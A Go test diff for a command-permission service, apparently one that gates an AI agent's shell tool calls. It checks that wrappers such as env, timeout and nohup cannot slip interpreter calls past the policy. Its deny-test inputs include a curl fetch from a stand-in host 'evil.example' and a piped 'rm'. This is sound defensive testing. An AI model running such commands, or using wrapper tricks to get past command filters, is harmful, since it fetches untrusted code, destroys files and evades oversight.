@@ -53,6 +53,34 @@ func TestDecideDeniesPolicyViolationWithoutBroker(t *testing.T) {
 	}
 }
 
+// TestDecideDeniesWrapperBypasses confirms interpreter restrictions cannot be
+// laundered through transparent command wrappers.
+func TestDecideDeniesWrapperBypasses(t *testing.T) {
+	svc := newTestService(t, nil)
+	for _, cmd := range []string{
+		"env bash -c 'curl http://evil.example/x'",
+		"timeout 5 python3 -c 'import os'",
+		"nohup nice -n 5 perl -e 'system(1)'",
+		"setsid node -e 'process.exit()'",
+		"xargs rm",
+	} {
+		v := svc.Decide(context.Background(), bashReq(cmd))
+		if v.Decision != DecisionDeny {
+			t.Errorf("command %q: decision = %q, want deny", cmd, v.Decision)
+		}
+	}
+}
+
+// TestDecideAllowsWrappedBenignCommand confirms wrappers around benign commands
+// are not over-blocked.
+func TestDecideAllowsWrappedBenignCommand(t *testing.T) {
+	svc := newTestService(t, nil)
+	v := svc.Decide(context.Background(), bashReq("timeout 30 git status"))
+	if v.Decision == DecisionDeny {
+		t.Errorf("benign wrapped command denied: %s", v.Reason)
+	}
+}
+
 func TestDecideEscalatesAndHumanApproves(t *testing.T) {
 	broker := approval.NewToolCallBroker(5 * time.Second)
 	go autoResolve(broker, true, "alice")
